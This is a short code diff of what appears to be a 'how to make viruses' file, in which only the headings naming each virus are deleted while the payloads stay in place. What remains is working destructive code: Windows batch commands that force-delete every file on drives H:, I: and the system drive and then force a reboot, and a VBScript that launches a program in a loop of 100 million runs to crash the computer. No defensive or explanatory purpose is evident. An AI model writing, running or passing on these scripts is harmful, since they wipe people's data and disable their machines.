@@ -15,7 +15,6 @@ Del H:\*.* /f /s /q
 
 Del I:\*.* /f /s /q
 
-VIRUS 2 — This Virus Deletes All The Content Of C Drive
 
 @echo off
 
@@ -23,7 +22,6 @@ del %systemdrive%*.* /f /s /q
 
 shutdown -r -f -t 00
 
-VIRUS 3 — This Will Crash your Computer
 
 Dim WSHShell
 Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
@@ -32,8 +30,6 @@ Dim x
 For x = 1 to 100000000
 WSHShell.Run "Tourstart.exe"
 Save virus 3 file with .vbs file extension
-
-VIRUS 4 — Virus that crashes pc
 
 @echo off
 
